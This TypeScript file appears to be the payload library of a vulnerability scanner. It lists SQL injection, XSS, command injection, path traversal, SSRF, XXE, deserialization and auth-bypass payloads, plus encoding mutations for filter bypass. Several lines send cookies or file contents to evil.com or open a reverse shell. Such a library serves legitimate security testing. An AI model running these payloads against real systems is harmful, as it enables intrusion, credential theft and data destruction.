/**
 * Layer 5: Exploit Payload Library
 * 
 * Comprehensive payload database for dynamic vulnerability testing.
 * Each payload category includes:
 * - Base payloads for initial testing
 * - Mutations for bypass attempts
 * - Encoding variations
 * - Context-specific variants
 */

// =============================================================================
// SQL INJECTION PAYLOADS
// =============================================================================

export const SQL_INJECTION_PAYLOADS = {
  /** Boolean-based blind injection */
  boolean: [
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'/*",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "') OR ('1'='1",
    "1 OR 1=1",
    "1' OR '1'='1' AND ''='",
  ],
  
  /** UNION-based injection */
  union: [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1 UNION SELECT username,password FROM users--",
    "1 UNION ALL SELECT 1,2,3,4--",
    "' UNION SELECT table_name,NULL FROM information_schema.tables--",
    "' UNION SELECT column_name,NULL FROM information_schema.columns--",
  ],
  
  /** Error-based injection */
  error: [
    "'",
    "\"",
    "1'",
    "1\"",
    "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))--",
    "' AND UPDATEXML(1,CONCAT(0x7e,version(),0x7e),1)--",
  ],
  
  /** Time-based blind injection */
  time: [
    "' OR SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' OR pg_sleep(5)--",
    "1' AND SLEEP(5)--",
    "1'; SELECT SLEEP(5);--",
  ],
  
  /** Stacked queries */
  stacked: [
    "'; DROP TABLE users--",
    "'; INSERT INTO users VALUES('pwned','pwned')--",
    "'; UPDATE users SET password='pwned'--",
    "1; SELECT * FROM users--",
  ],
  
  /** NoSQL injection */
  nosql: [
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$where": "1==1"}',
    "'; return true; var x='",
    '{"$regex": ".*"}',
  ],
};

// =============================================================================
// XSS PAYLOADS
// =============================================================================

export const XSS_PAYLOADS = {
  /** Basic script injection */
  script: [
    '<script>alert("XSS")</script>',
    '<script>alert(document.cookie)</script>',
    '<script>alert(1)</script>',
    '<script src="https://evil.com/xss.js"></script>',
    '<script>new Image().src="https://evil.com/?c="+document.cookie</script>',
  ],
  
  /** Event handler injection */
  event: [
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    '<body onload=alert("XSS")>',
    '<input onfocus=alert("XSS") autofocus>',
    '<marquee onstart=alert("XSS")>',
    '<video><source onerror=alert("XSS")>',
    '<details open ontoggle=alert("XSS")>',
  ],
  
  /** URL-based XSS */
  url: [
    'javascript:alert("XSS")',
    'javascript:alert(document.domain)',
    'data:text/html,<script>alert("XSS")</script>',
    'vbscript:alert("XSS")',
  ],
  
  /** Filter bypass */
  bypass: [
    '<ScRiPt>alert("XSS")</sCrIpT>',
    '<scr<script>ipt>alert("XSS")</scr</script>ipt>',
    '"><script>alert("XSS")</script>',
    "'><script>alert('XSS')</script>",
    '<img src=x onerror="alert(String.fromCharCode(88,83,83))">',
    '\\x3cscript\\x3ealert("XSS")\\x3c/script\\x3e',
    '<script>alert`XSS`</script>',
  ],
  
  /** DOM-based XSS */
  dom: [
    '#<script>alert("XSS")</script>',
    '?q=<script>alert("XSS")</script>',
    'javascript:/*--></title></style></textarea></script><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
  ],
};

// =============================================================================
// COMMAND INJECTION PAYLOADS
// =============================================================================

export const COMMAND_INJECTION_PAYLOADS = {
  /** Semicolon separator */
  semicolon: [
    '; ls -la',
    '; id',
    '; whoami',
    '; cat /etc/passwd',
    '; uname -a',
  ],
  
  /** Pipe operator */
  pipe: [
    '| ls -la',
    '| id',
    '| cat /etc/passwd',
    '| nc -e /bin/sh evil.com 4444',
  ],
  
  /** Ampersand operators */
  ampersand: [
    '&& ls -la',
    '& ls -la',
    '|| ls -la',
  ],
  
  /** Backticks and substitution */
  substitution: [
    '`id`',
    '$(id)',
    '`whoami`',
    '$(whoami)',
    '`cat /etc/passwd`',
  ],
  
  /** Newline injection */
  newline: [
    '\nid',
    '\r\nwhoami',
    '%0aid',
    '%0d%0awhoami',
  ],
  
  /** Windows-specific */
  windows: [
    '& dir',
    '| type C:\\Windows\\win.ini',
    '& whoami',
    '| net user',
  ],
};

// =============================================================================
// PATH TRAVERSAL PAYLOADS
// =============================================================================

export const PATH_TRAVERSAL_PAYLOADS = {
  /** Basic traversal */
  basic: [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\win.ini',
    '../../../etc/shadow',
    '../../../etc/hosts',
    '../../../../etc/passwd',
    '../../../../../etc/passwd',
  ],
  
  /** URL encoding */
  urlEncoded: [
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '%2e%2e/%2e%2e/%2e%2e/etc/passwd',
    '..%2f..%2f..%2fetc%2fpasswd',
    '%252e%252e%252f%252e%252e%252fetc%252fpasswd',
  ],
  
  /** Double encoding */
  doubleEncoded: [
    '..%252f..%252f..%252fetc/passwd',
    '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
  ],
  
  /** Null byte injection (legacy) */
  nullByte: [
    '../../../etc/passwd%00',
    '../../../etc/passwd%00.jpg',
    '../../../etc/passwd\x00',
  ],
  
  /** Bypass filters */
  bypass: [
    '....//....//....//etc/passwd',
    '..../....//....//etc/passwd',
    '..;/..;/..;/etc/passwd',
    '..\\..\\..\\/etc/passwd',
    '..%c0%af..%c0%af..%c0%afetc/passwd',
  ],
};

// =============================================================================
// SSRF PAYLOADS
// =============================================================================

export const SSRF_PAYLOADS = {
  /** Localhost access */
  localhost: [
    'http://localhost',
    'http://127.0.0.1',
    'http://[::1]',
    'http://0.0.0.0',
    'http://0',
    'http://localhost:22',
    'http://localhost:25',
    'http://localhost:3306',
    'http://localhost:6379',
    'http://127.1',
    'http://2130706433', // Decimal IP for 127.0.0.1
  ],
  
  /** Internal network */
  internal: [
    'http://192.168.0.1',
    'http://192.168.1.1',
    'http://10.0.0.1',
    'http://172.16.0.1',
    'http://169.254.169.254', // AWS metadata
    'http://169.254.169.254/latest/meta-data/',
    'http://metadata.google.internal',
    'http://100.100.100.200', // Alibaba Cloud
  ],
  
  /** Cloud metadata endpoints */
  cloud: [
    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    'http://169.254.169.254/latest/user-data/',
    'http://metadata.google.internal/computeMetadata/v1/',
    'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
  ],
  
  /** Protocol smuggling */
  protocols: [
    'file:///etc/passwd',
    'gopher://localhost:6379/_INFO',
    'dict://localhost:6379/INFO',
    'sftp://evil.com/',
    'ldap://evil.com/',
  ],
  
  /** DNS rebinding */
  dnsRebind: [
    'http://spoofed.burpcollaborator.net',
    'http://1.1.1.1.xip.io',
  ],
};

// =============================================================================
// XXE PAYLOADS
// =============================================================================

export const XXE_PAYLOADS = {
  /** Basic XXE */
  basic: [
    `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`,
    `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><root>&xxe;</root>`,
  ],
  
  /** Parameter entity XXE */
  parameter: [
    `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]><root></root>`,
  ],
  
  /** Blind XXE */
  blind: [
    `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://evil.com/xxe?data=file:///etc/passwd">%xxe;]><root></root>`,
  ],
  
  /** XXE via file upload */
  fileUpload: [
    `<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>`,
  ],
  
  /** XXE in SOAP */
  soap: [
    `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body>&xxe;</soap:Body></soap:Envelope>`,
  ],
};

// =============================================================================
// DESERIALIZATION PAYLOADS
// =============================================================================

export const DESERIALIZATION_PAYLOADS = {
  /** Node.js/JavaScript */
  nodejs: [
    '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\')}()"}',
    '{"__proto__":{"polluted":"yes"}}',
    '{"constructor":{"prototype":{"polluted":"yes"}}}',
  ],
  
  /** Python pickle */
  python: [
    // Base64 encoded pickle payloads would go here
    // These are dangerous so we use detection patterns instead
  ],
  
  /** Java */
  java: [
    // Ysoserial-style payloads reference
    'AC ED 00 05', // Java serialization magic bytes
  ],
  
  /** PHP */
  php: [
    'O:8:"stdClass":0:{}',
    'a:1:{s:4:"test";O:8:"stdClass":0:{}}',
  ],
};

// =============================================================================
// AUTHENTICATION BYPASS PAYLOADS
// =============================================================================

export const AUTH_BYPASS_PAYLOADS = {
  /** Default credentials */
  defaultCreds: [
    { username: 'admin', password: 'admin' },
    { username: 'admin', password: 'password' },
    { username: 'admin', password: '123456' },
    { username: 'root', password: 'root' },
    { username: 'test', password: 'test' },
    { username: 'guest', password: 'guest' },
  ],
  
  /** JWT manipulation */
  jwt: [
    // Algorithm none
    'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.',
    // Empty signature
    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.',
  ],
  
  /** Session manipulation */
  session: [
    'admin=true',
    'role=admin',
    'isAdmin=1',
    'authenticated=true',
  ],
  
  /** Header injection */
  headers: [
    { 'X-Forwarded-For': '127.0.0.1' },
    { 'X-Original-URL': '/admin' },
    { 'X-Rewrite-URL': '/admin' },
    { 'X-Custom-IP-Authorization': '127.0.0.1' },
  ],
};

// =============================================================================
// IDOR PAYLOADS
// =============================================================================

export const IDOR_PAYLOADS = {
  /** Numeric ID manipulation */
  numeric: [
    '1', '2', '0', '-1', '9999999', '1000000000',
  ],
  
  /** UUID/GUID manipulation */
  uuid: [
    '00000000-0000-0000-0000-000000000000',
    '11111111-1111-1111-1111-111111111111',
  ],
  
  /** Hash prediction */
  hash: [
    'admin', 'user', 'test', '1', '0',
  ],
};

// =============================================================================
// OPEN REDIRECT PAYLOADS
// =============================================================================

export const OPEN_REDIRECT_PAYLOADS = {
  /** Basic redirects */
  basic: [
    'https://evil.com',
    '//evil.com',
    '/\\evil.com',
    'https://evil.com%2f%2f',
  ],
  
  /** Filter bypass */
  bypass: [
    'https://evil.com?.trusted.com',
    'https://trusted.com@evil.com',
    'https://trusted.com.evil.com',
    'javascript:alert(document.domain)',
    '///evil.com',
    '\\/\\/evil.com',
  ],
  
  /** Encoded */
  encoded: [
    'https:%2F%2Fevil.com',
    'https:%252F%252Fevil.com',
    '%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d',
  ],
};

// =============================================================================
// PAYLOAD MUTATION ENGINE
// =============================================================================

export interface MutationStrategy {
  name: string;
  apply: (payload: string) => string;
}

/** URL encoding mutation */
const urlEncode: MutationStrategy = {
  name: 'url-encode',
  apply: (p) => encodeURIComponent(p),
};

/** Double URL encoding */
const doubleUrlEncode: MutationStrategy = {
  name: 'double-url-encode',
  apply: (p) => encodeURIComponent(encodeURIComponent(p)),
};

/** Unicode encoding */
const unicodeEncode: MutationStrategy = {
  name: 'unicode-encode',
  apply: (p) => {
    return p.split('').map(c => {
      const code = c.charCodeAt(0);
      return code > 127 ? c : `\\u${code.toString(16).padStart(4, '0')}`;
    }).join('');
  },
};

/** Case mutation */
const randomCase: MutationStrategy = {
  name: 'random-case',
  apply: (p) => {
    return p.split('').map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join('');
  },
};

/** Whitespace insertion */
const insertWhitespace: MutationStrategy = {
  name: 'insert-whitespace',
  apply: (p) => p.replace(/([<>])/g, ' $1 ').replace(/  +/g, ' '),
};

/** Comment insertion (for SQL) */
const insertSqlComments: MutationStrategy = {
  name: 'sql-comments',
  apply: (p) => p.replace(/ /g, '/**/'),
};

/** HTML entity encoding */
const htmlEntityEncode: MutationStrategy = {
  name: 'html-entity',
  apply: (p) => {
    return p
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#39;');
  },
};

/** Null byte insertion */
const insertNullByte: MutationStrategy = {
  name: 'null-byte',
  apply: (p) => p + '%00',
};

export const MUTATION_STRATEGIES: MutationStrategy[] = [
  urlEncode,
  doubleUrlEncode,
  unicodeEncode,
  randomCase,
  insertWhitespace,
  insertSqlComments,
  htmlEntityEncode,
  insertNullByte,
];

/**
 * Generate mutated payload variations
 */
export function mutatePayload(payload: string, maxMutations: number = 5): string[] {
  const mutations: string[] = [payload]; // Include original
  
  for (const strategy of MUTATION_STRATEGIES.slice(0, maxMutations)) {
    try {
      const mutated = strategy.apply(payload);
      if (mutated !== payload && !mutations.includes(mutated)) {
        mutations.push(mutated);
      }
    } catch {
      // Skip failed mutations
    }
  }
  
  return mutations;
}

/**
 * Get all payloads for a vulnerability type
 */
export function getPayloadsForCategory(categoryId: string): string[] {
  switch (categoryId) {
    case 'sql-injection':
      return [
        ...SQL_INJECTION_PAYLOADS.boolean,
        ...SQL_INJECTION_PAYLOADS.union,
        ...SQL_INJECTION_PAYLOADS.error,
      ];
    case 'xss':
      return [
        ...XSS_PAYLOADS.script,
        ...XSS_PAYLOADS.event,
        ...XSS_PAYLOADS.bypass,
      ];
    case 'command-injection':
      return [
        ...COMMAND_INJECTION_PAYLOADS.semicolon,
        ...COMMAND_INJECTION_PAYLOADS.pipe,
        ...COMMAND_INJECTION_PAYLOADS.substitution,
      ];
    case 'path-traversal':
      return [
        ...PATH_TRAVERSAL_PAYLOADS.basic,
        ...PATH_TRAVERSAL_PAYLOADS.urlEncoded,
        ...PATH_TRAVERSAL_PAYLOADS.bypass,
      ];
    case 'ssrf':
      return [
        ...SSRF_PAYLOADS.localhost,
        ...SSRF_PAYLOADS.internal,
        ...SSRF_PAYLOADS.cloud,
      ];
    case 'xxe':
      return [
        ...XXE_PAYLOADS.basic,
        ...XXE_PAYLOADS.blind,
      ];
    case 'missing-authentication':
      return AUTH_BYPASS_PAYLOADS.session;
    case 'idor':
      return IDOR_PAYLOADS.numeric;
    case 'open-redirect':
      return [
        ...OPEN_REDIRECT_PAYLOADS.basic,
        ...OPEN_REDIRECT_PAYLOADS.bypass,
      ];
    default:
      return [];
  }
}

/**
 * Get payloads with mutations for thorough testing
 */
export function getPayloadsWithMutations(
  categoryId: string,
  maxPayloads: number = 20
): string[] {
  const basePayloads = getPayloadsForCategory(categoryId).slice(0, 5);
  const allPayloads: string[] = [];
  
  for (const payload of basePayloads) {
    allPayloads.push(...mutatePayload(payload, 3));
  }
  
  // Deduplicate and limit
  return [...new Set(allPayloads)].slice(0, maxPayloads);
}
